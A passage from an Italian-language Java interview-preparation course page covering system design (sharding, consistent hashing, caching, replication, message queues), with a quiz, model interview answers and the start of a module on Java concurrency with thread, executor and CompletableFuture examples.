│  DIRECTORY-BASED SHARDING                                                   │
│  ────────────────────────                                                   │
│  Lookup table: user_id → shard_id                                          │
│                                                                             │
│  Pro: Flessibilità massima, resharding graduale                            │
│  Con: Lookup table diventa single point of failure                          │
│       Overhead di una query extra                                           │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Consistent Hashing</h3>
                <p>Risolve il problema del resharding: quando aggiungi/rimuovi nodi, solo K/n chiavi devono essere riassegnate (invece di tutte).</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                          Consistent Hashing Ring                            │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│                           0°                                                │
│                          ━━━                                               │
│                      ╱         ╲                                           │
│                   ╱      N1       ╲     N1 handles: 270° - 45°             │
│                ╱         ●          ╲                                       │
│             45°                      90°                                    │
│            ━━━                        ━━━                                   │
│           ╱                              ╲                                  │
│          │           Hash Ring            │                                 │
│          │                                │  Key "user123" → hash → 120°   │
│          │       ○ key "user123"          │  → lands on N2                  │
│           ╲                              ╱                                  │
│            ━━━                        ━━━                                   │
│            270°  ●                  ● 180°                                  │
│                  N3    ╲        ╱   N2                                      │
│                         ╲      ╱        N2 handles: 45° - 180°             │
│                          ━━━━━━                                            │
│                                                                             │
│  Quando N2 viene rimosso:                                                   │
│  • Solo le chiavi di N2 (45°-180°) vengono riassegnate a N3                │
│  • N1 e N3 non vengono toccati                                             │
│  • Con n nodi, ~1/n delle chiavi migrano (non tutte!)                      │
│                                                                             │
│  Virtual Nodes: ogni server fisico ha più punti sull'anello                │
│  → Migliore distribuzione, graceful capacity changes                        │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <pre><code class="language-java">public class ConsistentHash&lt;T&gt; {
    private final TreeMap&lt;Long, T&gt; ring = new TreeMap&lt;&gt;();
    private final int virtualNodes;
    private final HashFunction hashFunction;

    public void addNode(T node) {
        for (int i = 0; i < virtualNodes; i++) {
            long hash = hashFunction.hash(node.toString() + "#" + i);
            ring.put(hash, node);
        }
    }

    public void removeNode(T node) {
        for (int i = 0; i < virtualNodes; i++) {
            long hash = hashFunction.hash(node.toString() + "#" + i);
            ring.remove(hash);
        }
    }

    public T getNode(String key) {
        if (ring.isEmpty()) return null;

        long hash = hashFunction.hash(key);

        // Trova il primo nodo con hash >= key hash
        Map.Entry&lt;Long, T&gt; entry = ring.ceilingEntry(hash);

        // Se non esiste, wrap around al primo nodo
        if (entry == null) {
            entry = ring.firstEntry();
        }

        return entry.getValue();
    }
}</code></pre>

                <h3>Message Queues come Disaccoppiamento</h3>
                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│              Synchronous vs Asynchronous Communication                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  SYNCHRONOUS (tight coupling)                                              │
│  ─────────────────────────────                                              │
│                                                                             │
│  Service A ──HTTP──► Service B ──HTTP──► Service C                          │
│      │                  │                   │                               │
│      └──────────────────┴───────────────────┘                               │
│              Se B o C sono down, A fallisce                                 │
│              A deve aspettare che B e C rispondano                          │
│                                                                             │
│  ────────────────────────────────────────────────────────────────────────   │
│                                                                             │
│  ASYNCHRONOUS (loose coupling via message queue)                           │
│  ────────────────────────────────────────────────                           │
│                                                                             │
│  Service A ──► [  Message Queue  ] ◄── Service B                            │
│                     (Kafka)        ◄── Service C                            │
│                                                                             │
│  Pro:                                                                       │
│  • A non aspetta B e C (fire and forget)                                   │
│  • Se B down, i messaggi rimangono in coda                                 │
│  • B e C possono scalare indipendentemente                                 │
│  • Natural load leveling (queue assorbe picchi)                            │
│                                                                             │
│  Con:                                                                       │
│  • Eventual consistency (A non sa subito se B ha processato)               │
│  • Complessità operativa (gestire la queue)                                │
│  • Debugging più difficile (tracing asincrono)                             │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>CDN e Caching Multi-Livello</h3>
                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                         Multi-Level Caching                                 │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  User Request                                                               │
│       │                                                                     │
│       ▼                                                                     │
│  ┌─────────────┐                                                            │
│  │ Browser     │  L1: Browser cache (Cache-Control headers)                │
│  │ Cache       │  TTL: seconds-minutes, private per user                   │
│  └──────┬──────┘                                                            │
│         │ miss                                                              │
│         ▼                                                                   │
│  ┌─────────────┐                                                            │
│  │ CDN Edge    │  L2: CDN cache (Cloudflare, Akamai, CloudFront)           │
│  │ (worldwide) │  TTL: minutes-hours, geo-distributed                      │
│  └──────┬──────┘  Best for: static assets, public content                  │
│         │ miss                                                              │
│         ▼                                                                   │
│  ┌─────────────┐                                                            │
│  │ API Gateway │  L3: Application cache (Redis/Memcached)                  │
│  │ Cache       │  TTL: seconds-minutes, invalidation-aware                 │
│  └──────┬──────┘  Best for: API responses, session data                    │
│         │ miss                                                              │
│         ▼                                                                   │
│  ┌─────────────┐                                                            │
│  │ Database    │  L4: DB query cache, materialized views                   │
│  │             │                                                            │
│  └─────────────┘                                                            │
│                                                                             │
│  Cache-Control: max-age=3600, public        → CDN e browser cachano        │
│  Cache-Control: max-age=0, private          → Solo browser, no CDN         │
│  Cache-Control: no-store                    → Nessun caching               │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Database Replication</h3>
                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                       Replication Topologies                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  MASTER-SLAVE (Single-Leader)                                              │
│  ────────────────────────────                                               │
│                                                                             │
│       ┌──────────┐                                                          │
│       │  Master  │◄──── All Writes                                          │
│       │  (Leader)│                                                          │
│       └────┬─────┘                                                          │
│            │ replication (async or sync)                                    │
│     ┌──────┼──────┐                                                         │
│     ▼      ▼      ▼                                                         │
│  ┌─────┐┌─────┐┌─────┐                                                      │
│  │Slave││Slave││Slave│◄──── All Reads (scaled horizontally)                 │
│  └─────┘└─────┘└─────┘                                                      │
│                                                                             │
│  Pro: Semplice, read scaling, failover chiaro                              │
│  Con: Single point of write, replication lag                               │
│                                                                             │
│  ────────────────────────────────────────────────────────────────────────   │
│                                                                             │
│  MULTI-MASTER (Multi-Leader)                                               │
│  ───────────────────────────                                                │
│                                                                             │
│  ┌──────────┐         ┌──────────┐                                          │
│  │ Master 1 │◄───────►│ Master 2 │     Writes su entrambi                  │
│  │ (EU)     │         │ (US)     │     Sync bidirezionale                  │
│  └──────────┘         └──────────┘                                          │
│                                                                             │
│  Pro: Write scaling, geo-distribution, no single point of failure          │
│  Con: Conflitti (stesso record modificato su entrambi)                     │
│       Complessità di conflict resolution                                    │
│                                                                             │
│  Conflict resolution strategies:                                            │
│  • Last-Write-Wins (LWW): timestamp più recente vince                      │
│  • Application-level merge: logica custom per risolvere                    │
│  • CRDTs: data structures conflict-free by design                          │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>
            </section>

            <!-- Quiz Section Modulo 13 -->
            <section class="quiz-section" id="modulo13-quiz">
                <h2>Quiz - Modulo 13: System Design</h2>

                <div class="quiz-question" data-correct="c">
                    <h4>Q61. Per un URL shortener con 100:1 read:write ratio, qual è la strategia di caching migliore?</h4>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q61" value="a">
                            <span>Write-through cache: ogni write aggiorna subito il cache</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q61" value="b">
                            <span>Write-behind cache: le write vanno prima in cache, poi async al DB</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q61" value="c">
                            <span>Cache-aside (lazy loading): popola il cache on read miss</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q61" value="d">
                            <span>No caching: con read replicas il DB gestisce tutto il traffico</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q61')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q61"></div>
                </div>

                <div class="quiz-question" data-correct="b">
                    <h4>Q62. In un news feed system, qual è il problema principale del "fan-out on write" per utenti con milioni di follower?</h4>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q62" value="a">
                            <span>Latenza di lettura troppo alta per i follower</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q62" value="b">
                            <span>Write amplification: un singolo post genera milioni di scritture</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q62" value="c">
                            <span>Impossibilità di implementare il ranking personalizzato</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q62" value="d">
                            <span>I follower non ricevono notifiche push</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q62')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q62"></div>
                </div>

                <div class="quiz-question" data-correct="d">
                    <h4>Q63. Perché consistent hashing è preferibile a semplice hash-based sharding quando devi scalare dinamicamente?</h4>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q63" value="a">
                            <span>Consistent hashing è più veloce da calcolare</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q63" value="b">
                            <span>Consistent hashing permette range queries</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q63" value="c">
                            <span>Consistent hashing elimina completamente il data movement</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q63" value="d">
                            <span>Aggiungendo/rimuovendo nodi, solo ~1/n delle chiavi devono migrare</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q63')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q63"></div>
                </div>

                <div class="quiz-question" data-correct="a">
                    <h4>Q64. In un rate limiter distribuito, perché si usa uno script Lua in Redis invece di operazioni separate GET/INCR?</h4>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q64" value="a">
                            <span>Lo script Lua viene eseguito atomicamente, evitando race conditions</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q64" value="b">
                            <span>Lua è più veloce del protocollo Redis standard</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q64" value="c">
                            <span>Lua permette di usare strutture dati non disponibili in Redis</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q64" value="d">
                            <span>Lua riduce il consumo di memoria di Redis</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q64')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q64"></div>
                </div>

                <div class="quiz-question" data-correct="c">
                    <h4>Q65. In un sistema di chat, perché si usa Cassandra per lo storage dei messaggi invece di PostgreSQL?</h4>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q65" value="a">
                            <span>Cassandra supporta transazioni ACID che PostgreSQL non ha</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q65" value="b">
                            <span>Cassandra ha un query language più espressivo di SQL</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q65" value="c">
                            <span>Cassandra è ottimizzato per write-heavy workloads e scaling orizzontale</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q65" value="d">
                            <span>Cassandra permette JOIN tra tabelle che PostgreSQL non supporta</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q65')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q65"></div>
                </div>
            </section>

            <!-- Questions Section Modulo 13 -->
            <section class="section" id="modulo13-questions">
                <h2>Domande da Colloquio - Modulo 13</h2>

                <div class="info-box">
                    <h4>Q: Come inizieresti a progettare un URL shortener?</h4>
                    <p><strong>Risposta attesa:</strong> Inizio chiarendo i requisiti: quanti URL/giorno? Read:write ratio? Serve analytics? Custom aliases? Expiration? Poi stimo: 100M writes/day = ~1200 QPS write, con 100:1 ratio = ~120K QPS read. Storage per 10 anni = ~180TB. Per short code, con base62 e 7 caratteri ho 3.5T combinazioni. Architettura: Load Balancer → Web Servers → Redis cache (read-heavy!) → SQL DB con read replicas. Per generazione short code: hash-based con collision handling o Key Generation Service pre-computed. Cache-aside pattern perché il 99% del traffico sono redirect.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Spiega la differenza tra fan-out on write e fan-out on read nel contesto di un news feed.</h4>
                    <p><strong>Risposta attesa:</strong> <strong>Fan-out on write (push model)</strong>: quando pubblichi, scrivi il post nel feed di ogni follower. Pro: read è O(1), già pre-computato. Con: write amplification (1M follower = 1M writes). <strong>Fan-out on read (pull model)</strong>: quando apri l'app, fai query ai post di tutti i tuoi following e li mergi. Pro: no write amplification. Con: read lento se segui migliaia di persone. <strong>Soluzione ibrida</strong>: fan-out on write per utenti normali (<10K follower), fan-out on read per celebrity. Il feed finale è merge dei due.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come garantiresti at-least-once delivery in un notification system?</h4>
                    <p><strong>Risposta attesa:</strong> Uso una message queue persistente (Kafka). Workflow: 1) Producer scrive messaggio in Kafka (ack dal broker = durably stored). 2) Consumer legge, processa, POI fa commit dell'offset. Se consumer muore prima del commit, il messaggio verrà riprocessato. 3) Per evitare duplicati lato receiver (at-least-once può causare duplicati), uso idempotency key: ogni notifica ha un UUID, il receiver ignora se già processato (check in cache/DB). 4) Retry con exponential backoff per errori temporanei (provider down). 5) Dead Letter Queue per messaggi che falliscono dopo N tentativi.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Perché useresti consistent hashing per un distributed cache?</h4>
                    <p><strong>Risposta attesa:</strong> Con hash semplice (key % N nodes), aggiungendo un nodo TUTTE le chiavi devono essere rimappate (perché N cambia). Con consistent hashing, i nodi sono posizionati su un ring virtuale. Una chiave va al primo nodo in senso orario. Aggiungendo un nodo, solo le chiavi tra il nodo precedente e il nuovo devono migrare (~1/N delle chiavi, non tutte). Virtual nodes migliorano la distribuzione: ogni server fisico ha multipli punti sul ring. Usato in Cassandra, DynamoDB, memcached. Permette scaling graduale senza invalidare l'intero cache.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come gestiresti il "celebrity problem" in un chat system (gruppo con milioni di membri)?</h4>
                    <p><strong>Risposta attesa:</strong> Invece di fare fan-out a tutti i membri (impossibile per milioni), uso un modello pub/sub. Il messaggio viene salvato UNA volta nel message store con topic = group_id. I membri online si iscrivono al topic via WebSocket. Solo loro ricevono push in real-time. Membri offline: quando si riconnettono, fanno pull dei messaggi persi (query: messaggi del gruppo con timestamp > last_seen). Posso usare segmenting: divido il gruppo in sub-groups per fan-out parziale. Delivery status: sampling (mostra "letto da X persone" invece di tick per ognuno).</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come progetteresti un sistema di rate limiting distribuito?</h4>
                    <p><strong>Risposta attesa:</strong> Algoritmo: sliding window counter (compromesso tra accuratezza e memoria). Storage: Redis centralizzato con Lua script per atomicità (GET + INCR + EXPIRE in un'unica operazione). Key: "ratelimit:{user_id}:{window}" dove window = timestamp / window_size. Calcolo: count_prev × (1 - position_in_window) + count_curr. Se < limit, incremento e permetto. Headers di risposta: X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Reset. Fallback: se Redis down, uso local in-memory rate limiter (degraded ma funzionante) o fail-open (dipende dal risk tolerance). Per scale: Redis Cluster con sharding per user_id.</p>
                </div>
            </section>

            <!-- Links Modulo 13 -->
            <section class="section" id="modulo13-links">
                <h2>Link di Approfondimento - Modulo 13</h2>

                <div class="info-box">
                    <h4>System Design Learning</h4>
                    <p><a href="https://github.com/donnemartin/system-design-primer" target="_blank">System Design Primer</a> - Risorsa fondamentale GitHub</p>
                    <p><a href="https://www.educative.io/courses/grokking-modern-system-design-interview-for-engineers-managers" target="_blank">Grokking System Design Interview</a></p>
                    <p><a href="https://bytebytego.com/" target="_blank">ByteByteGo</a> - Alex Xu's system design</p>
                </div>

                <div class="info-box">
                    <h4>Case Studies & Engineering Blogs</h4>
                    <p><a href="https://engineering.fb.com/" target="_blank">Meta Engineering Blog</a></p>
                    <p><a href="https://netflixtechblog.com/" target="_blank">Netflix Tech Blog</a></p>
                    <p><a href="https://blog.twitter.com/engineering" target="_blank">Twitter Engineering</a></p>
                    <p><a href="https://engineering.linkedin.com/blog" target="_blank">LinkedIn Engineering</a></p>
                    <p><a href="https://uber.com/blog/engineering/" target="_blank">Uber Engineering</a></p>
                </div>

                <div class="info-box">
                    <h4>Specific Topics</h4>
                    <p><a href="https://www.aosabook.org/en/index.html" target="_blank">The Architecture of Open Source Applications</a></p>
                    <p><a href="https://highscalability.com/" target="_blank">High Scalability Blog</a></p>
                    <p><a href="https://blog.cloudflare.com/" target="_blank">Cloudflare Blog</a> - CDN, networking</p>
                </div>

                <div class="info-box">
                    <h4>Libri Consigliati</h4>
                    <p><a href="https://www.amazon.com/System-Design-Interview-insiders-Second/dp/B08CMF2CQF" target="_blank">System Design Interview Vol 1 & 2</a> - Alex Xu</p>
                    <p><a href="https://dataintensive.net/" target="_blank">Designing Data-Intensive Applications</a> - Martin Kleppmann</p>
                </div>
            </section>

            <!-- ==================== MODULO 14: CONCURRENCY & MULTITHREADING ==================== -->
            <header class="module-header" id="modulo14">
                <span class="module-tag">Modulo 14</span>
                <h1>Concurrency & Multithreading</h1>
                <p>Padroneggiare la programmazione concorrente in Java: dai fondamenti ai Virtual Threads di Java 21</p>
            </header>

            <!-- Fundamentals Section -->
            <section class="section" id="modulo14-fundamentals">
                <h2>Fondamenti della Concorrenza</h2>

                <p>La concorrenza permette a un programma di eseguire più task "contemporaneamente". In Java, l'unità base di esecuzione concorrente è il <strong>Thread</strong>.</p>

                <h3>Thread, Runnable, Callable</h3>

                <pre><code class="language-java">// Modo 1: Estendere Thread (sconsigliato - viola composizione su ereditarietà)
class MyThread extends Thread {
    @Override
    public void run() {
        System.out.println("Running in: " + Thread.currentThread().getName());
    }
}

// Modo 2: Implementare Runnable (preferito - separa task da esecuzione)
class MyTask implements Runnable {
    @Override
    public void run() {
        System.out.println("Task executing");
    }
}

// Modo 3: Lambda (Java 8+) - più conciso
Runnable task = () -> System.out.println("Lambda task");

// Modo 4: Callable - può ritornare un valore e lanciare eccezioni
Callable&lt;Integer&gt; callable = () -> {
    Thread.sleep(1000);
    return 42;
};

// Esecuzione
Thread t1 = new MyThread();
t1.start();  // start() crea nuovo thread, run() esegue nel thread corrente!

Thread t2 = new Thread(new MyTask());
t2.start();

Thread t3 = new Thread(task);
t3.start();

// Callable richiede ExecutorService (vedi sezione successiva)
ExecutorService executor = Executors.newSingleThreadExecutor();
Future&lt;Integer&gt; future = executor.submit(callable);
Integer result = future.get();  // blocking, aspetta il risultato</code></pre>

                <h3>Thread Lifecycle</h3>
                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                           Thread Lifecycle                                  │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│                        ┌─────────┐                                          │
│                        │   NEW   │  Thread creato ma non avviato            │
│                        └────┬────┘                                          │
│                             │ start()                                       │
│                             ▼                                               │
│                        ┌─────────┐                                          │
│            ┌──────────►│RUNNABLE │◄──────────┐  Pronto per esecuzione       │
│            │           └────┬────┘           │  o in esecuzione             │
│            │                │                │                              │
│            │    ┌───────────┼───────────┐    │                              │
│            │    │           │           │    │                              │
│            │    ▼           ▼           ▼    │                              │
│       ┌─────────┐    ┌─────────┐   ┌─────────┐                              │
│       │ BLOCKED │    │ WAITING │   │ TIMED   │                              │
│       │         │    │         │   │ WAITING │                              │
│       └────┬────┘    └────┬────┘   └────┬────┘                              │
│            │              │             │                                   │
│   lock     │   notify/    │   timeout/  │                                   │
│   acquired │   interrupt  │   notify    │                                   │
│            └──────────────┴─────────────┘                                   │
│                             │                                               │
│                             │ run() completes / exception                   │
│                             ▼                                               │
│                        ┌─────────┐                                          │
│                        │TERMINATED│  Thread terminato                       │
│                        └─────────┘                                          │
│                                                                             │
│  BLOCKED: aspetta di acquisire un lock (synchronized)                       │
│  WAITING: wait(), join(), LockSupport.park()                               │
│  TIMED_WAITING: sleep(ms), wait(ms), join(ms)                              │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>synchronized, volatile, atomic</h3>
                <pre><code class="language-java">// PROBLEMA: Race condition
class Counter {
    private int count = 0;

    public void increment() {
        count++;  // NON atomico! Read → Increment → Write
    }
}

// Due thread che chiamano increment() 1000 volte ciascuno
// Risultato atteso: 2000
// Risultato reale: < 2000 (race condition!)

// SOLUZIONE 1: synchronized (mutual exclusion)
class SynchronizedCounter {
    private int count = 0;

    public synchronized void increment() {  // lock sull'istanza (this)
        count++;
    }

    // Equivalente con blocco esplicito
    public void incrementExplicit() {
        synchronized (this) {
            count++;
        }
    }
}

// SOLUZIONE 2: volatile (visibilità, NON atomicità)
class VolatileFlag {
    private volatile boolean running = true;  // visibile a tutti i thread

    public void stop() {
        running = false;  // immediatamente visibile agli altri thread
    }

    public void run() {
        while (running) {  // senza volatile, il thread potrebbe non vedere mai false
            // ... do work
        }
    }
}
// ATTENZIONE: volatile NON rende count++ atomico!

// SOLUZIONE 3: Atomic classes (atomicità senza lock)
import java.util.concurrent.atomic.AtomicInteger;

class AtomicCounter {
    private AtomicInteger count = new AtomicInteger(0);

    public void increment() {
        count.incrementAndGet();  // atomico, usa CAS (Compare-And-Swap)
    }

    public int get() {
        return count.get();
    }
}

// CAS: confronta il valore corrente con quello atteso,
// se uguale aggiorna, altrimenti riprova (spin)
// Più efficiente di synchronized per contention bassa</code></pre>

                <h3>Race Conditions e Deadlock</h3>
                <pre><code class="language-java">// RACE CONDITION: risultato dipende dall'ordine di esecuzione dei thread
// Esempio: check-then-act non atomico
class LazyInit {
    private Object instance;

    public Object getInstance() {
        if (instance == null) {           // Thread A: check
            instance = new Object();       // Thread A: act
        }                                  // Thread B potrebbe fare lo stesso!
        return instance;
    }
}

// Soluzione: double-checked locking (con volatile!)
class SafeLazyInit {
    private volatile Object instance;  // DEVE essere volatile!

    public Object getInstance() {
        if (instance == null) {                    // prima check senza lock
            synchronized (this) {
                if (instance == null) {            // seconda check con lock
                    instance = new Object();
                }
            }
        }
        return instance;
    }
}

// DEADLOCK: due thread aspettano l'uno il lock dell'altro
class DeadlockExample {
    private final Object lock1 = new Object();
    private final Object lock2 = new Object();

    public void method1() {
        synchronized (lock1) {
            System.out.println("Thread 1: holding lock1");
            synchronized (lock2) {  // aspetta lock2, che ha Thread 2
                System.out.println("Thread 1: holding lock1 & lock2");
            }
        }
    }

    public void method2() {
        synchronized (lock2) {
            System.out.println("Thread 2: holding lock2");
            synchronized (lock1) {  // aspetta lock1, che ha Thread 1
                System.out.println("Thread 2: holding lock2 & lock1");
            }
        }
    }
    // Se Thread 1 chiama method1() e Thread 2 chiama method2() → DEADLOCK!
}

// PREVENZIONE DEADLOCK:
// 1. Lock ordering: acquisire sempre i lock nello stesso ordine
// 2. Lock timeout: tryLock(timeout) invece di lock()
// 3. Deadlock detection: JVM può rilevare deadlock (jstack, JConsole)

class NoDeadlock {
    private final Object lock1 = new Object();
    private final Object lock2 = new Object();

    public void method1() {
        synchronized (lock1) {  // sempre lock1 prima
            synchronized (lock2) {
                // safe
            }
        }
    }

    public void method2() {
        synchronized (lock1) {  // stesso ordine!
            synchronized (lock2) {
                // safe
            }
        }
    }
}</code></pre>

                <div class="info-box warning">
                    <h4>Deadlock Conditions (tutte necessarie)</h4>
                    <ul>
                        <li><strong>Mutual Exclusion:</strong> risorsa non condivisibile</li>
                        <li><strong>Hold and Wait:</strong> thread tiene una risorsa mentre aspetta un'altra</li>
                        <li><strong>No Preemption:</strong> risorsa rilasciata solo volontariamente</li>
                        <li><strong>Circular Wait:</strong> catena circolare di thread che aspettano</li>
                    </ul>
                    <p>Per prevenire deadlock, rompi almeno una di queste condizioni (tipicamente: lock ordering rompe circular wait).</p>
                </div>
            </section>

            <!-- Executors Section -->
            <section class="section" id="modulo14-executors">
                <h2>ExecutorService e CompletableFuture</h2>

                <p>Creare Thread manualmente è inefficiente e error-prone. <code>ExecutorService</code> gestisce un pool di thread riutilizzabili.</p>

                <h3>ThreadPool Types</h3>
                <pre><code class="language-java">import java.util.concurrent.*;

// 1. FixedThreadPool: numero fisso di thread
// Usa quando: conosci il numero ottimale di thread (es: CPU cores)
ExecutorService fixed = Executors.newFixedThreadPool(4);

// 2. CachedThreadPool: crea thread on-demand, riutilizza quelli idle
// Usa quando: molti task brevi, numero variabile
// ATTENZIONE: può creare troppi thread se i task sono lenti!
ExecutorService cached = Executors.newCachedThreadPool();

// 3. SingleThreadExecutor: un solo thread, coda FIFO
// Usa quando: vuoi esecuzione sequenziale garantita
ExecutorService single = Executors.newSingleThreadExecutor();

// 4. ScheduledThreadPool: per task schedulati/periodici
ScheduledExecutorService scheduled = Executors.newScheduledThreadPool(2);
scheduled.schedule(() -> System.out.println("Delayed"), 5, TimeUnit.SECONDS);
scheduled.scheduleAtFixedRate(() -> System.out.println("Periodic"), 0, 1, TimeUnit.SECONDS);

// 5. WorkStealingPool (Java 8+): ForkJoinPool, work-stealing per parallelismo
ExecutorService stealing = Executors.newWorkStealingPool();

// Sempre shutdown quando finito!
fixed.shutdown();  // aspetta che i task completino
// fixed.shutdownNow();  // interrompe i task in esecuzione

// Best practice: configurazione esplicita
ThreadPoolExecutor custom = new ThreadPoolExecutor(
    4,                      // corePoolSize
    10,                     // maxPoolSize
    60L, TimeUnit.SECONDS,  // keepAliveTime per thread oltre core
    new ArrayBlockingQueue&lt;&gt;(100),  // bounded queue
    new ThreadPoolExecutor.CallerRunsPolicy()  // rejection policy
);

// Rejection policies:
// - AbortPolicy: lancia RejectedExecutionException (default)
// - CallerRunsPolicy: esegue nel thread chiamante (back-pressure)
// - DiscardPolicy: scarta silenziosamente
// - DiscardOldestPolicy: scarta il task più vecchio in coda</code></pre>

                <h3>Future</h3>
                <pre><code class="language-java">ExecutorService executor = Executors.newFixedThreadPool(2);

// Future rappresenta un risultato che sarà disponibile in futuro
Future&lt;String&gt; future = executor.submit(() -> {
    Thread.sleep(2000);
    return "Result";
});

// Metodi Future
future.isDone();      // true se completato (success, exception, cancelled)
future.isCancelled(); // true se cancellato
future.cancel(true);  // tenta di cancellare (true = interrupt if running)

// get() è BLOCKING!
try {
    String result = future.get();                    // aspetta indefinitamente
    String result2 = future.get(5, TimeUnit.SECONDS); // timeout
} catch (InterruptedException e) {
    // thread corrente interrotto mentre aspettava
} catch (ExecutionException e) {
    // il task ha lanciato un'eccezione
    Throwable cause = e.getCause();  // eccezione originale
} catch (TimeoutException e) {
    // timeout scaduto
}

// PROBLEMA: Future è limitato
// - get() è blocking (no callback)
// - Non puoi combinare/chainare Future
// - Non puoi gestire eccezioni in modo elegante</code></pre>

                <h3>CompletableFuture (Java 8+)</h3>
                <pre><code class="language-java">import java.util.concurrent.CompletableFuture;

// CompletableFuture risolve tutti i limiti di Future

// Creazione
CompletableFuture&lt;String&gt; cf1 = CompletableFuture.supplyAsync(() -> {
    // esegue in ForkJoinPool.commonPool() di default
    return "Hello";
});

// Con executor custom
ExecutorService myExecutor = Executors.newFixedThreadPool(4);
CompletableFuture&lt;String&gt; cf2 = CompletableFuture.supplyAsync(() -> "World", myExecutor);

// CHAINING: thenApply, thenAccept, thenRun
CompletableFuture&lt;String&gt; result = CompletableFuture
    .supplyAsync(() -> "Hello")
    .thenApply(s -> s + " World")      // trasforma il risultato (map)
    .thenApply(String::toUpperCase);   // altra trasformazione
// result.get() = "HELLO WORLD"

// thenAccept: consuma il risultato (no return)
CompletableFuture.supplyAsync(() -> "Hello")
    .thenAccept(s -> System.out.println(s));  // stampa "Hello"

// thenRun: esegue dopo, ignora il risultato
CompletableFuture.supplyAsync(() -> "Hello")
    .thenRun(() -> System.out.println("Done!"));

// COMBINING: thenCompose, thenCombine
// thenCompose: flatMap (quando il secondo step ritorna CompletableFuture)
CompletableFuture&lt;String&gt; composed = CompletableFuture
    .supplyAsync(() -> "userId")
    .thenCompose(userId -> fetchUserFromDb(userId));  // ritorna CF&lt;User&gt;

// thenCombine: combina due CF indipendenti
CompletableFuture&lt;String&gt; combined = CompletableFuture
    .supplyAsync(() -> "Hello")
    .thenCombine(
        CompletableFuture.supplyAsync(() -> "World"),
        (s1, s2) -> s1 + " " + s2
    );
// combined.get() = "Hello World"

// allOf: aspetta che tutti completino
CompletableFuture&lt;Void&gt; all = CompletableFuture.allOf(cf1, cf2);
all.join();  // ora cf1 e cf2 sono completati

// anyOf: ritorna al primo che completa
CompletableFuture&lt;Object&gt; any = CompletableFuture.anyOf(cf1, cf2);

// ERROR HANDLING
CompletableFuture&lt;String&gt; withErrorHandling = CompletableFuture
    .supplyAsync(() -> {
        if (Math.random() > 0.5) throw new RuntimeException("Oops!");
        return "Success";
    })
    .exceptionally(ex -> {
        System.err.println("Error: " + ex.getMessage());
        return "Fallback value";  // recovery
    });

// handle: gestisce sia successo che errore
CompletableFuture&lt;String&gt; handled = CompletableFuture
    .supplyAsync(() -> "data")
    .handle((result, ex) -> {
        if (ex != null) {
            return "Error: " + ex.getMessage();
        }
        return "Success: " + result;
    });

// Async variants: thenApplyAsync esegue in altro thread
// Utile se la trasformazione è CPU-intensive
CompletableFuture.supplyAsync(() -> "data")
    .thenApplyAsync(s -> heavyComputation(s), myExecutor);</code></pre>

                <div class="info-box success">
                    <h4>Pattern: Parallel API Calls</h4>
